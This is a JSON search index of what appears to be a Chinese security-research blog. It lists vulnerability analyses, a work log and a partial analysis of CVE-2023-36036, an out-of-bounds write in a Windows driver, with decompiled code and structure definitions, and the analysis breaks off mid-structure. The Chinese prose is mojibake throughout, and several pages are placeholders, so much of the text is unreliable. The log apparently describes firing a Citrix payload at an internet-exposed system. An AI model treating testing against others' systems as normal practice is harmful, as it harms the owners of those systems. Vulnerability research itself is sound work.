[{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Windows CLFS æ¼æ´æ¦‚è§ˆ åºå· æ¼æ´å ç¼–å· ç±»å‹ 2 windows CLFS æƒé™æå‡æ¼æ´ CVE-2023-28252 æƒé™æå‡ 1 windows CLFS æƒé™æå‡æ¼æ´ CVE-2022-37969 æƒé™æå‡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"Ntlm åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"web Webå®‰å…¨ç ”ç©¶ç›¸å…³\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"ä»£ç å®¡è®¡","tags":[],"description":"","content":"ä»£ç å®¡è®¡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windowsä¸­çš„kerberosåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos åè®®","tags":[],"description":"","content":"kerberosåè®®ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dllæ³¨å…¥","tags":[],"description":"","content":"Dllæ³¨å…¥ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socksåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"åº”ç”¨å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"ä¼ è¾“å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"ç½‘ç»œå±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"å®‰å…¨ç ”ç©¶","tags":[],"description":"","content":"å®‰å…¨ç ”ç©¶ è®°å½•å®‰å…¨ç ”ç©¶ç›¸å…³æ–‡ç« \n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":"æ¼æ´åˆ†æ ä¸€äº›æ¼æ´åˆ†ææ–‡ç« ã€‚\nåºå· æ¼æ´å ç¼–å· ç±»å‹ çŠ¶æ€ 42 41 40 39 38 37 36 35 34 33 32 31 30 â˜ 29 Windows äº‘æ–‡ä»¶è¿·ä½ è¿‡æ»¤é©±åŠ¨æƒé™æå‡æ¼æ´ CVE-2023-36036 æƒé™æå‡ âœ“ 28 wordpad ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-36563 ä¿¡æ¯æ³„éœ² âœ“ 27 squid æ‹’ç»æœåŠ¡æ¼æ´ æ‹’ç»æœåŠ¡ âœ“ 26 Citrix Gateway ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-4966 ä¿¡æ¯æ³„éœ² âœ“ 25 http2 å¿«é€Ÿé‡ç½®æ”»å‡» CVE-2023-44487 æ‹’ç»æœåŠ¡ âœ“ 24 curlå †æº¢å‡ºæ¼æ´ CVE-2023-38545 æ‹’ç»æœåŠ¡ âœ“ 23 ç‘å‹å¤©ç¿¼ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ ä»£ç æ‰§è¡Œ âœ“ 22 libwebp è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-4863 ä»£ç æ‰§è¡Œ âœ— 21 jumpserver ä»»æ„å¯†ç é‡ç½®æ¼æ´ CVE-2023-42820 å¯†ç é‡ç½® âœ“ 20 Winrar ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-38831 ä»£ç æ‰§è¡Œ âœ“ 19 windows é”™è¯¯æŠ¥å‘ŠæœåŠ¡ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-36874 æƒé™æå‡ âœ“ 18 Windows ICS æƒé™æå‡æ¼æ´ CVE-2023-38148 ä»£ç æ‰§è¡Œ âœ“ 17 Cirtix Gateway RCE CVE-2023-3519 ä»£ç æ‰§è¡Œ âœ“ 16 Openfire èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ CVE-2023-32315 èº«ä»½è®¤è¯ç»•è¿‡ âœ— 15 Smartbi RCE QVD-2023-5326 ä»£ç æ‰§è¡Œ âœ“ 14 Windows CLFS æƒé™æå‡æ¼æ´ç³»åˆ— æƒé™æå‡ âœ— 13 gitlab ç›®å½•ç©¿è¶Šæ¼æ´ CVE-2023-2825 ä¿¡æ¯æ³„éœ² âœ“ 12 zero logonåˆ†æ CVE-2020-1472 æƒé™æå‡ âœ“ 11 windows http.sys æƒé™æå‡æ¼æ´ CVE-2023-23410 æƒé™æå‡ âœ“ 10 TerraMaster TOSä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-24990 ä»£ç æ‰§è¡Œ âœ— 9 PgAdmin ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-4223 ä»£ç æ‰§è¡Œ âœ“ 8 sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 æƒé™æå‡ âœ— 7 Minioä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-28432 ä¿¡æ¯æ³„éœ² âœ“ 6 Strapi ä»£ç æ‰§è¡Œæ¼æ´é“¾ ä»£ç æ‰§è¡Œ âœ— 5 Outlook æƒé™æå‡æ¼æ´ CVE-2023-23397 æƒé™æå‡ âœ“ 4 OWASSRF å’Œ TabShellåˆ†æ CVE-2022-41080 CVE-2022-41076 ä»£ç æ‰§è¡Œ âœ— 3 proxy not shell æ¼æ´é“¾ CVE-2022-41040 CVE-2022-41082 ä»£ç æ‰§è¡Œ âœ— 2 proxy shell æ¼æ´é“¾ CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 ä»£ç æ‰§è¡Œ âœ— 1 win32k æƒé™æå‡æ¼æ´ CVE-2021-40449 æƒé™æå‡ âœ“ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"é¦–é¡µ","tags":[],"description":"","content":"å­¦ä¹ è®°å½• è®°å½•ä¸€äº›å¹³æ—¶å­¦ä¹ å’Œç”Ÿæ´»çš„æ—¥å¸¸ã€‚\n11-20è‡³11-25\r| 7 days ago\råˆ†æäº†åœ¨é‡åˆ©ç”¨çš„ CVE-2023-36036 Windows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´\nWindows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´ 2023\r10-31è‡³11-01\r1 day | 27 days ago\råˆ†æäº†åœ¨é‡åˆ©ç”¨çš„wordpad ä¿¡æ¯æ³„éœ²æ¼æ´\nwordpad ä¿¡æ¯æ³„éœ²æ¼æ´ 2023\r10-19è‡³10-25\r6 days | 39 days ago\råˆ†æäº†ä¸¤ä¸ªæ¼æ´\nCitrix ä¿¡æ¯æ³„éœ²æ¼æ´ squid æ‹’ç»æœåŠ¡æ¼æ´ 2023\r10-14è‡³10-15\r1 day | 44 days ago\rå¤ç°åˆ†æäº†curl å †æº¢å‡ºæ¼æ´\ncurlå †æº¢å‡ºæ¼æ´ 2023\r10-12è‡³10-13\r1 day | 46 days ago\rå¤ç°åˆ†æäº†http2 å¿«é€Ÿé‡ç½®æ”»å‡»\nhttp rapid reset ddos attack 2023\r09-19è‡³09-19\r| 69 days ago\ræŠŠä¹‹å‰å†™çš„æ–‡ç« æ•´ç†åˆ°äº†åšå®¢\nwindows é”™è¯¯æŠ¥å‘ŠæœåŠ¡æƒé™æå‡æ¼æ´ winrar ä»£ç æ‰§è¡Œæ¼æ´ 2023\r09-14è‡³09-18\r4 days | 74 days ago\råˆ†æäº†ä»¥ä¸‹9æœˆè¡¥ä¸æ—¥çš„CVE-2023-38148, åˆ†ææ–‡ç« ï¼š\nwindows ics rce 2023\r07-24è‡³07-27\r3 days | 126 days ago\rå‰å‡ å¤©æ­å»ºCitrix ADCç¯å¢ƒï¼Œå®åœ¨æ˜¯å¤ªéš¾æ­äº†ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©ä»å…¬ç½‘æ‰¾äº†ä¸ªç¯å¢ƒæ‰“äº†ä¸€ä¸‹payloadï¼Œdiffäº†ä»¥ä¸‹è¡¥ä¸ï¼Œå†™äº†ä¸€ä¸ªåˆ†æï¼Œå¯æƒœä¸èƒ½æœ¬åœ°è°ƒè¯•ï¼Œçœ‹èµ·æ¥å†™expåº”è¯¥æŒºç®€å•çš„ã€‚åˆ†æè§\ncitrix adc rce æ›´æ–°ï¼šæ­å»ºäº†è°ƒè¯•ç¯å¢ƒï¼Œè°ƒè¯•äº†ä¸€ä¸‹ï¼Œæ›´æ–°åœ¨åŸé“¾æ¥\n2023\r09-13è‡³09-16\r3 days | 440 days ago\rè¿™å‘¨å†å†™ä¸€ä¸ªåŸºäºrustçš„loaderï¼Œå†™äº†ä¸€åŠå‘ç°åŠ è½½çš„dllå¤ªå¤šäº†ï¼Œå†æƒ³åŠæ³•ç”¨åŠ¨æ€åŠ è½½çš„æ–¹å¼åŠ è½½dllï¼Œæ„Ÿè§‰ç”¨ruståšæœ‰ç‚¹éš¾ã€‚\nç”¨rustçš„å†…è”æ±‡ç¼–è·å–åˆ°äº†kernel32.dllå’Œntdll.dllçš„åŸºå€ï¼Œè¿˜è¦ç»§ç»­å®Œå–„ã€‚\n2022\r09-10è‡³09-12\r2 days | 443 days ago\rä¸­ç§‹èŠ‚ï¼Œåœ¨å®¶æ‘¸äº†å‡ å¤©ğŸŸï¼Œå•¥éƒ½æ²¡å¹²\n2022\r09-05è‡³09-09\r4 days | 448 days ago\rè¿™å‘¨ç¼–è¯‘äº†wireshark 1.8.5ï¼Œé€šè¿‡diff1.8.5å’Œ1.8.6çš„æºç æ‰¾å‡º1.8.5é‡Œé¢çš„æ¼æ´ï¼Œè§\nwireshark 1.8.5ä»£ç å®¡è®¡ 2022\r09-03è‡³09-04\r1 day | 450 days ago\rè¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§\nå¢åŠ timelineåŠŸèƒ½ 2022\r08-29è‡³09-02\r4 days | 455 days ago\rå‘¨å†…çœ‹äº†ä¸€ä¸ªå‡ ç™¾è¡Œçš„ä»£ç ï¼Œè§\rnews_serverå®¡è®¡\n2022\ré»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"ç”Ÿæ´»éšç¬”","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"æ‚é¡¹","tags":[],"description":"","content":"æ‚é¡¹ æš‚æ— \n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"å…¶ä»–","tags":[],"description":"","content":"å…¶ä»– "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/","title":"CVE-2023-36036 Windows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Windows Cloud Files Mini Filter é©±åŠ¨ä¸­å­˜åœ¨è¶Šç•Œå†™å…¥æ¼æ´ï¼Œåœ¨è§£æReparse pointæ•°æ®æ—¶ï¼Œç”±äºmemcpyå‡½æ•°çš„é•¿åº¦å‚æ•°ç”¨æˆ·å¯æ§ï¼Œæºå†…å­˜å¯æ§ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ç»“æ„å¹¶ä¼ é€’ç»™Windows Cloud Files Mini Filter é©±åŠ¨ï¼Œé€ æˆè¶Šç•Œå†™å…¥ï¼Œå¹¶åœ¨å†…æ ¸æ‰§è¡Œä»»æ„ä»£ç ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º Windows 10 23å¹´10æœˆè¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• cldflt.sysé©±åŠ¨ä¸­å®ç°äº†äº‘æ–‡ä»¶çš„å„é¡¹åŠŸèƒ½ï¼Œdiffè¯¥é©±åŠ¨ï¼Œä¿®æ”¹å‡½æ•°å¦‚ä¸‹ï¼š\nåœ¨HsmpRpiDecompressBufferå‡½æ•°ä¸­æœ‰å¦‚ä¸‹ä¿®æ”¹ï¼Œå¯¹*(_WORD *)(a1 + 10)æ·»åŠ äº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯å¦\u0026gt;0x4000ï¼Œ\nå¦‚æœå¤§äºåˆ™æŠ›å‡ºé”™è¯¯ 0xC000CF02å¯¹åº” STATUS_CLOUD_FILE_METADATA_CORRUPT\nhttps://endodermis59.rssing.com/chan-36587470/all_p6.html\nAIè¾“å‡º\nHsmpRpiDecompressBufferå‡½æ•°çš„ä½œç”¨æ˜¯è§£å‹å‹ç¼©åçš„Reparse Pointæ•°æ®ã€‚ ä¸»è¦åŠŸèƒ½åŒ…æ‹¬: 1. æ ¡éªŒä¼ å…¥æ•°æ®çš„å®Œæ•´æ€§å’Œé­”æ•°æ˜¯å¦æ­£ç¡® 2. å¦‚æœæ•°æ®è¢«å‹ç¼©,åˆ™æ ¹æ®åŸé•¿åº¦åˆ†é…è§£å‹ç¼“å†²åŒº 3. è°ƒç”¨RtlDecompressBufferè¿›è¡Œå®é™…è§£å‹ 4. æ£€æŸ¥è§£å‹åæ•°æ®é•¿åº¦æ˜¯å¦åŒ¹é… 5. å¦‚æœè§£å‹æˆåŠŸ,è¿”å›è§£å‹åçš„æ•°æ® 6. å¦åˆ™è¿”å›é”™è¯¯ç  æ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„å‹ç¼©æ•°æ®è§£å‹å‡½æ•°,æ¥æ”¶åŸå§‹å‹ç¼©æ•°æ®,æ ¡éªŒ-\u0026gt;åˆ†é…ç¼“å†²åŒº-\u0026gt;è§£å‹-\u0026gt;è¿”å›è§£å‹åæ•°æ®çš„è¿‡ç¨‹ã€‚ é€šè¿‡è§£å‹è®©åç»­ä»£ç å¯ä»¥å¤„ç†æœªå‹ç¼©çš„Reparse Pointæ•°æ®,ä¸€èˆ¬åœ¨éœ€è¦æäº¤/æ›´æ–°æ•°æ®æ—¶ä¼šè§£å‹ã€‚ ä¸»è¦ä½œç”¨å°±æ˜¯å°†å‹ç¼©åçš„Reparse Pointè¿˜åŸä¸ºå¯è¯»çš„æœªå‹ç¼©æ•°æ®ã€‚ HsmpRpiDecompressBufferç”± HsmpRpReadBufferè°ƒç”¨\n__int64 __fastcall HsmpRpReadBuffer(PFLT_INSTANCE Instance, PFILE_OBJECT FileObject, unsigned __int16 **a3) { ... *a3 = 0i64; v6 = 1024; OutputBuffer = (unsigned __int16 *)ExAllocatePoolWithTag(PagedPool, 0x400ui64, 0x70527348u); v8 = OutputBuffer; ...... } LODWORD(v9) = HsmpRpiDecompressBuffer((__int64)v8, v6, a3); HsmDbgBreakOnStatus((unsigned int)v9); if ( (int)v9 \u0026lt; 0 ) { v16 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { goto LABEL_8; } v17 = 20i64; goto LABEL_30; } if ( *a3 != v8 ) LABEL_8: ExFreePoolWithTag(v8, 0x70527348u); return (unsigned int)v9; } AIè§£é‡Š\nè¿™æ®µä»£ç å®ç°äº†è§£æå’Œè§£å‹Reparse Pointæ•°æ®çš„åŠŸèƒ½: 1. åˆ†é…OutputBufferå†…å­˜ç”¨äºè¯»å–Reparseæ•°æ®ã€‚ 2. è°ƒç”¨FltFsControlFileè¯»å–Reparseæ•°æ®åˆ°OutputBufferã€‚ 3. å¦‚æœè¯»å–å¤±è´¥,å¹¶ä¸”é”™è¯¯ç è¡¨ç¤ºbufferå¤ªå°,åˆ™é‡æ–°åˆ†é…æ›´å¤§çš„bufferå¹¶é‡è¯•è¯»å–ã€‚ 4. è°ƒç”¨HsmpRpiDecompressBufferå¯¹è¯»å–åˆ°çš„æ•°æ®è¿›è¡Œè§£å‹ã€‚ 5. å¦‚æœè§£å‹æˆåŠŸ,è¿”å›è§£å‹åçš„æ•°æ®,å¦åˆ™è¿”å›é”™è¯¯ç ã€‚ 6. é‡Šæ”¾åŸå§‹æ•°æ®å†…å­˜ã€‚ 7. å…¶ä¸­åŒ…å«äº†è¯¦ç»†çš„é”™è¯¯å’Œæ—¥å¿—è®°å½•é€»è¾‘ã€‚ æ‰€ä»¥æ€»çš„æ¥è¯´,è¿™æ®µä»£ç ç”¨äºä»æ–‡ä»¶ç³»ç»Ÿè¯»å–Reparse Pointæ•°æ®,ç„¶åå¯¹æ•°æ®è¿›è¡Œè§£å‹å’Œè§£æ,æœ€åè¿”å›è§£æåçš„æ•°æ®ã€‚ ä¸»è¦åŠŸèƒ½èšç„¦åœ¨è¯»å–å‹ç¼©æ•°æ®å¹¶è§£å‹è¿™å—ã€‚ HsmpRpReadBufferç”± HsmpRpCommitNoLockå’Œ HsmpSetupContextsè°ƒç”¨ã€‚\nHsmpRpCommitNoLockè§£é‡Šå¦‚ä¸‹\nè¿™ä¸ªCå‡½æ•°å®ç°äº†HsmpRpCommitNoLock,å®ƒä¼¼ä¹æ˜¯ç”¨äºåœ¨æ²¡æœ‰é”çš„æƒ…å†µä¸‹æäº¤é¡µé¢é‡æ’­(Page Replay)æ•°æ®ã€‚ ä¸»è¦çš„é€»è¾‘å¦‚ä¸‹: 1. æ ¡éªŒå’Œå‡†å¤‡è¾“å…¥æ•°æ® 2. åˆ†é…å†…å­˜æ± æ¥å­˜å‚¨æäº¤çš„æ•°æ® 3. æ„å»ºæ•°æ®ç»“æ„,å¡«å……å„ç§å…ƒæ•°æ® 4. å°è¯•å‹ç¼©æ•°æ® 5. å°†æ•°æ®å†™å…¥æ–‡ä»¶ 6. æ¸…ç†ä¸´æ—¶æ•°æ®ç»“æ„å’Œå†…å­˜ å…·ä½“æ¥è¯´,è¿™ä¸ªå‡½æ•°åšäº†ä»¥ä¸‹å·¥ä½œ: 1. éªŒè¯è¾“å…¥å‚æ•°çš„æœ‰æ•ˆæ€§ 2. ä¸ºè¾“å‡ºç¼“å†²åŒºåˆ†é…å†…å­˜ 3. æ„å»ºè¾“å‡ºç¼“å†²åŒºçš„æ•°æ®ç»“æ„ 4. å¡«å……è¾“å‡ºç¼“å†²åŒºçš„å¤´éƒ¨ 5. å°†è¾“å…¥ç¼“å†²åŒºçš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒº 6. è®¡ç®—æ ¡éªŒå’Œ 7. å°è¯•å‹ç¼©è¾“å‡ºç¼“å†²åŒº 8. æ ‡è®°æ–‡ä»¶å±æ€§ 9. å°†è¾“å‡ºç¼“å†²åŒºçš„æ•°æ®å†™å…¥æ–‡ä»¶ 10. é‡ç½®æ–‡ä»¶å±æ€§ 11. é‡Šæ”¾ä¸´æ—¶ç¼“å†²åŒºå’Œå†…å­˜ æ‰€ä»¥æ€»çš„æ¥è¯´,è¿™ä¸ªå‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯å‡†å¤‡å¹¶æäº¤é¡µé¢é‡æ’­æ•°æ®,åŒæ—¶å¤„ç†å¿…è¦çš„æ ¡éªŒã€å‹ç¼©å’Œæ¸…ç†å·¥ä½œã€‚ åœ¨ HsmpRpCommitNoLockä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å‰é¢diffä¸­å‡ºç°çš„0x4000å’Œ0x3FFCï¼Œå¯ä»¥çŒœæµ‹æ¼æ´äº§ç”Ÿäºè¯¥å‡½æ•°ä¸­\nLABEL_156: PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); if ( *((_WORD *)v58 + 7) ) { v60 = *v59; if ( ((v60 + 3) \u0026amp; 0xFFFFFFFFFFFFFFFCui64) + 1 \u0026lt;= 0x3FFC )// 12 åç§» { *v59 = (v60 + 3) \u0026amp; 0xFFFFFFFC; if ( *(_WORD *)v9 ) *((_WORD *)v58 + 6) |= 1u; *(_WORD *)v9 = 7; LODWORD(v9) = 0; *((_WORD *)v58 + 9) = 1; v61 = *v59; *((_DWORD *)v58 + 5) = v61; v58[v61] = 1; ç»§ç»­å®¡æŸ¥ä»£ç ï¼Œå‘ç°åœ¨HsmpRpCommitNoLockä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œåœ¨do whileå¾ªç¯ä¸­è°ƒç”¨memmoveå‡½æ•°æ—¶ï¼Œä¼ å…¥çš„srcæ¥æºäº HsmpRpReadBufferè§£å‹åçš„element[10]æ•°æ®ï¼Œdstä¸ºExAllocatePoolWithTagåˆ†é…çš„å¤§å°ä¸º0x4000çš„å†…å­˜ã€‚é•¿åº¦å‚æ•°æ¥æºäºElementInfos[10].Lengthï¼Œä¸éš¾çœ‹å‡ºç”±æ­¤å¯ä»¥é€ æˆè¶Šç•Œå†™å…¥ï¼Œä¸”ç”¨æˆ·å¯æ§ã€‚\nv32 = 0i64; if ( (v9 \u0026amp; 0x80000000) == 0i64 ) { v8 = (char *)P + 12; ... { if ( (_DWORD)v54 \u0026amp;\u0026amp; (_WORD)v55 ) v167 = \u0026amp;v8[v54]; else v167 = v32; ..... PoolWithTag = (unsigned int *)ExAllocatePoolWithTag(PagedPool, 0x4000ui64, 0x70527348u); v142 = PoolWithTag; v11 = (char *)PoolWithTag; if ( PoolWithTag ) { memset(PoolWithTag, 0, 0x4000ui64); v57 = InputBuffer; v58 = v11 + 4; if ( v8 \u0026amp;\u0026amp; *((_WORD *)v8 + 7) \u0026gt; 0xAu ) v57 = *((_WORD *)v8 + 7); v59 = (unsigned int *)(v58 + 8); *((_WORD *)v58 + 6) = 0; v9 = (unsigned __int64)(v58 + 16); *((_WORD *)v58 + 7) = v57; *((_DWORD *)v58 + 2) = 8 * v57 + 16; *(_DWORD *)v58 = \u0026#39;pReF\u0026#39;; memset(v58 + 16, 0, 8i64 * v57); ..... } *v59 += v109; ..... if ( *((_WORD *)v58 + 28) ) *((_WORD *)v58 + 6) |= 1u; *v59 = (v113 + 3) \u0026amp; 0xFFFFFFFC; .... *v59 += v114; ..... v117 = (char *)v167; v107 = (char *)Src; *v59 = (v118 + 3) \u0026amp; 0xFFFFFFFC; *((_WORD *)v58 + 32) = 17; *((_WORD *)v58 + 33) = v119; v121 = *v59; *((_DWORD *)v58 + 17) = v121; if ( \u0026amp;v58[v121] != v117 ) { memmove(\u0026amp;v58[v121], v117, v120); ...... v125 = 10; do { v126 = v125; *(HSM_ELEMENT_INFO *)\u0026amp;v58[8 * v125 + 16] = v124-\u0026gt;ElementInfos[v125]; memmove(\u0026amp;v58[*v59], (char *)v124 + v124-\u0026gt;ElementInfos[v125].Offset, v124-\u0026gt;ElementInfos[v125].Length); ++v125; *(_DWORD *)\u0026amp;v58[8 * v126 + 20] = *v59; *v59 += *(unsigned __int16 *)\u0026amp;v58[8 * v126 + 18]; } while ( v125 \u0026lt; v124-\u0026gt;NumberOfElements ); ... if ( v14 ) ExFreePoolWithTag(v14, 0x70527348u); if ( v11 ) ExFreePoolWithTag(v11, 0x70527348u); return (unsigned int)v9; } æœç´¢Reparse point RtlCompressBufferï¼Œæ‰¾åˆ°æ–‡ç« ï¼Œæ ¹æ®\ræ–‡ç«  _REPARSE_DATA_BUFFERå®šä¹‰å¦‚ä¸‹ï¼Œå¯ä»¥çŸ¥é“ä¼ å…¥ HsmpRpiDecompressBufferçš„æ˜¯ REPARSE_DATA_BUFFERï¼Œå…¶ä¸­ ReparseTagä¸ºIO_REPARSE_TAG_CLOUD_3 å€¼ 0x9000301A å¹¶ä¸”åœ¨ç»“æ„ä½“ HsmReparseBufferRawçš„RawDataæˆå‘˜ä¸­å­˜å‚¨äº†ç”± (RtlCompressBufferå‹ç¼©çš„æ•°æ® HsmReparseBufferRaw\n// Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; _REPARSE_DATA_BUFFERå®šä¹‰\ntypedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; // Reparse tag type USHORT ReparseDataLength; // Length of the reparse data USHORT Reserved; // Used internally by NTFS to store remaining length union { // Structure for IO_REPARSE_TAG_SYMLINK // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; /* Example of distinction between substitute and print names: // mklink /d ldrive c:\\ // SubstituteName: c:\\\\??\\ // PrintName: c:\\ */ } SymbolicLinkReparseBuffer; // Structure for IO_REPARSE_TAG_MOUNT_POINT // Handled by nt!IoCompleteRequest struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; // Structure for IO_REPARSE_TAG_WIM // Handled by wimmount!FPOpenReparseTarget-\u0026gt;wimserv.dll // (wimsrv!ImageExtract) struct { GUID ImageGuid; // GUID of the mounted VIM image BYTE ImagePathHash[0x14]; // Hash of the path to the file within the // image } WimImageReparseBuffer; // Structure for IO_REPARSE_TAG_WOF // Handled by FSCTL_GET_EXTERNAL_BACKING, FSCTL_SET_EXTERNAL_BACKING in // NTFS (Windows 10+) struct { //-- WOF_EXTERNAL_INFO -------------------- ULONG Wof_Version; // Should be 1 (WOF_CURRENT_VERSION) ULONG Wof_Provider; // Should be 2 (WOF_PROVIDER_FILE) //-- FILE_PROVIDER_EXTERNAL_INFO_V1 -------------------- ULONG FileInfo_Version; // Should be 1 (FILE_PROVIDER_CURRENT_VERSION) ULONG FileInfo_Algorithm; // Usually 0 (FILE_PROVIDER_COMPRESSION_XPRESS4K) } WofReparseBuffer; // Structure for IO_REPARSE_TAG_APPEXECLINK struct { ULONG StringCount; // Number of the strings in the StringList, separated // by \u0026#39;\\0\u0026#39; WCHAR StringList[1]; // Multistring (strings separated by \u0026#39;\\0\u0026#39;, // terminated by \u0026#39;\\0\\0\u0026#39;) } AppExecLinkReparseBuffer; // Structure for IO_REPARSE_TAG_WCI (0x80000018) struct { ULONG Version; // Expected to be 1 by wcifs.sys ULONG Reserved; GUID LookupGuid; // GUID used for lookup in wcifs!WcLookupLayer USHORT WciNameLength; // Length of the WCI subname, in bytes WCHAR WciName[1]; // The WCI subname (not zero terminated) } WcifsReparseBuffer; // Handled by cldflt.sys!HsmpRpReadBuffer struct { USHORT Flags; // Flags (0x8000 = not compressed) USHORT Length; // Length of the data (uncompressed) BYTE RawData[1]; // To be RtlDecompressBuffer-ed } HsmReparseBufferRaw; // Dummy structure struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME; } REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER; åœ¨\rè¿™ä¸ªGithubä»“åº“ä¸­å®ç°äº†å¯¹Reparse pointçš„è§£æï¼Œå…¶ä¸­å®šä¹‰äº†HSM_REPARSE_DATA\ntypedef struct _HSM_ELEMENT_INFO { USHORT Type; // Type of the element (?). One of HSM_ELEMENT_TYPE_XXX USHORT Length; // Length of the element data in bytes ULONG Offset; // Offset of the element data, relative to begin of HSM_DATA. Aligned to 4 bytes } HSM_ELEMENT_INFO, *PHSM_ELEMENT_INFO; typedef struct _HSM_DATA { ULONG Magic; // 0x70527442 (\u0026#39;pRtB\u0026#39;) for bitmap data, 0x70526546 (\u0026#39;FeRp\u0026#39;) for file data ULONG Crc32; // CRC32 of the following data (calculated by RtlComputeCrc32) ULONG Length; // Length of the entire HSM_DATA in bytes USHORT Flags; // 